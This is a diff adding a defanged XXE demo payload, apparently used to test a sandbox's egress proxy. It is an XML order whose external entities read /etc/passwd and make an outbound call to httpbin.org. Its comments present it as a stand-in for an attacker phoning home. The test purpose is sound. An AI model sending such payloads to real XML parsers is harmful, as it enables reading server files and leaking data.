@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  XXE demo payload (defanged). Two external entities:
+    - &xxe;   reads a local file (the sandbox's own /etc/passwd)
+    - &exfil; makes an outbound call to a public echo service (httpbin.org)
+  The outbound call only carries a marker (x=leak), no file contents. It stands in for
+  "phoning home": a real attacker would point it at their own server.
+
+  httpbin.org resolves, so the call genuinely reaches the sandbox's egress proxy
+  and shows up in `aca sandbox egress decisions` as Denied. (A non-resolvable name fails
+  at DNS before the proxy ever sees it, and the decisions log stays empty.)
+  Rehearsal: run with egress allowed and httpbin echoes the request back.
+-->
+<!DOCTYPE order [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY exfil SYSTEM "https://httpbin.org/anything/collect?x=leak">
+]>
+<order>
+  <id>SO-2026-EVIL</id>
+  <customer>&xxe;</customer>
+  <lines>
+    <line><sku>&exfil;</sku><qty>1</qty></line>
+  </lines>
+</order>
